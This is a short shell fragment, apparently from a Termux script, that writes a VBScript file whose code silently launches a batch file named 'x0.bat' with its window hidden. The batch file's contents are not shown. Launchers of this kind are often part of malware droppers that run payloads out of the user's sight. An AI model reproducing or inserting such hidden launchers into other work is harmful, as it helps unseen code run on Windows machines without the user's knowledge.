echo 'Set WshShell = CreateObject("WScript.Shell")' >> /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
echo 'WshShell.Run chr(34) & "x0.bat" & Chr(34), 0' >> /data/data/com.termux/files/home/99/0/x1/$vbsx.vbs
